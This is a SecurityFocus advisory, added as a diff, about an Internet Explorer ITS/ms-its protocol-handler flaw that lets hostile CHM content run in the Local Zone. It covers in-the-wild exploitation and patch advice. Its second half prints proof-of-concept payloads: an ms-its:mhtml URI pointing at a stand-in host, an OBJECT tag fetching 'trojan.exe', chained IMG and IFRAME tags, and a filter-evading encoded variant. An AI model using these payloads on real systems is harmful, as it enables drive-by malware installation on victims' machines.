@@ -1,0 +1,40 @@
+source: http://www.securityfocus.com/bid/9658/info
+
+Microsoft Internet Explorer has been reported prone to a vulnerability that may permit hostile content to be interpreted in the Local Zone. 
+
+The issue may be exploited via the ITS (InfoTech Storage) Protocol URI handler. It is possible to use this protocol to force a browser into the Local Zone by redirecting into a non-existent MHTML file (using other known vulnerabilities). In this manner, it may be possible to reference hostile content to be executed in the Local Zone, such as a malicious CHM file. The issue, in combination with other vulnerabilities, is exploitable to provide for automatic delivery and execution of an arbitrary executable. This would occur when malicious web content is rendered in Internet Explorer.
+
+Outlook products and other components that use Internet Explorer to render HTML content also present possible attack vectors for this issue.
+
+It should be noted that there are multiple ways to invoke the protocol handler, such as through its:, ms-its:, ms-itss: and mk:@MSITStore: URIs. It has also been reported that web browsers other than Internet Explorer may also invoke the operating system URI handlers for the ITS protocol.
+
+It has been reported that this vulnerability is actively being exploited as an infection vector for malicious code that has been dubbed Trojan.Ibiza.
+
+**NOTE: Microsoft has released a cumulative update for Outlook Express (MS04-013) to address the MHTML-related vulnerabilities that are commonly exploited in tandem with this issue. While MS04-013 lists the same CVE candidate name as this BID, it is not currently known if this update also addresses the distinct ITS Protocol vulnerability. However, users are advised to apply the available updates, as they will reduce exposure to existing exploits that rely on the MHTML issues to exploit this or other vulnerabilities. It should be noted that if this individual vulnerability has not been addressed by the update, there may still potentially be other attack vectors which do not rely on the MHTML issues.
+
+**Update: Symantec has observed targeted attacks "in the wild" with confirmation that systems were compromised as a result. Users are advised to ensure that the patch has been installed and take appropriate measures to avoid future attacks using potentially unpublished and unpatched vulnerabilities. This includes disabling scripting and active content by default wherever possible (use the MSIE Zone functionality to permit scripting for content from trusted domains). Avoid visiting suspicious links, such as those included in e-mail/instant messages or other untrustworthy communications. Disable HTML e-mail, if possible.
+
+ms-its:mhtml:file://C:\ss.MHT!http://www.example.com//chm.chm::/files/launch.htm
+
+The following example demonstrates the exploitation of this issue:
+
+The attacker would create a script (ie; launch.html) containing a CLASSID exploit as a CHM such as:
+&lt;OBJECT NAME='X' CLASSID='CLSID:11111111-1111-1111-1111-111111111123' CODEBASE='trojan.exe'>
+
+The attacker would then utilize another script tag to execute the launch.html such as:
+<IMG SRC='ms-its:mhtml:file://C:\ss.MHT!http://www.example.com//chm.chm::/files/launch.htm'><IMG
+SRC='ms-its:mhtml:file://C:\ss.MHT!http://www.example.com//chm.chm::/files/launch.htm'><IMG
+SRC='ms-its:mhtml:file://C:\ss.MHT!http://www.example.com//chm.chm::/files/launch.htm'><IFRAME
+SRC='redirgen.php?url=URL:ms-its:mhtml:file://C:\ss.MHT!http://www.example.com//chm.chm::/files/launch.htm'>
+
+Additional proof-of-concepts have been published by http-equiv and Jelmer that demonstrate different payloads:
+http://www.malware.com/junk-de-lux.html
+http://ip3e83566f.speed.planet.nl/security/newone/exploit.htm
+
+Additional proof-of-concepts were provided in the "IE ms-its: and mk:@MSITStore: vulnerability" BugTraq post by Roozbeh Afrasiabi.
+
+Jelmer also released the following proof-of-concept example which may potentially bypass some filters due to using encoded characters in the exploit string:
+
+&#109;s-its:mhtml:file://C:\foo.mht!${PATH}/EXPLOIT.CHM::/exploit.htm
+
+This issue is known to be exploited in the wild.
